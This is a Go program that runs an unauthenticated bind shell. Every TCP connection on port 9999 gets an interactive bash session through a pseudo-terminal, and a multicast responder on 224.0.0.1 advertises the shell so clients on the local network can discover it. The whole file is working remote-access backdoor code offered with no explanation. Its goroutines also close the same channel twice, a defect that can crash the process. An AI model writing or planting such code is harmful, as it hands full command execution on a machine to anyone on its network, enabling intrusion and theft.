package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"

	"github.com/creack/pty"
)

const (
	multicastAddr = "224.0.0.1"
	multicastPort = 9999
)

func main() {
	go runMulticastListener()

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", multicastPort))
	if err != nil {
		fmt.Println("Error starting server:", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Printf("Server listening on port %d...\n", multicastPort)

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		go handleConnection(conn)
	}
}

func runMulticastListener() {
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", multicastAddr, multicastPort))
	if err != nil {
		fmt.Println("Error resolving multicast address:", err)
		return
	}

	listener, err := net.ListenMulticastUDP("udp", nil, addr)
	if err != nil {
		fmt.Println("Error setting up multicast listener:", err)
		return
	}
	defer listener.Close()

	buf := make([]byte, 1024)

	for {
		n, clientAddr, err := listener.ReadFromUDP(buf)
		if err != nil {
			fmt.Println("Error reading from multicast:", err)
			continue
		}

		clientIP := clientAddr.IP.String()
		fmt.Printf("Received multicast from client IP: %s\n", clientIP)

		message := string(buf[:n])
		if message == "CLIENT_SEARCHING" {
			response := fmt.Sprintf("SERVER_READY:%d", multicastPort)
			_, err = listener.WriteToUDP([]byte(response), clientAddr)
			if err != nil {
				fmt.Println("Error sending response to multicast:", err)
			}
		}
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	shell := exec.Command("bash")
	pty, err := pty.Start(shell)
	if err != nil {
		fmt.Println("Error starting PTY:", err)
		return
	}
	defer pty.Close()

	done := make(chan struct{})
	go func() {
		io.Copy(pty, conn)
		close(done)
	}()

	go func() {
		io.Copy(conn, pty)
		close(done)
	}()

	<-done
}
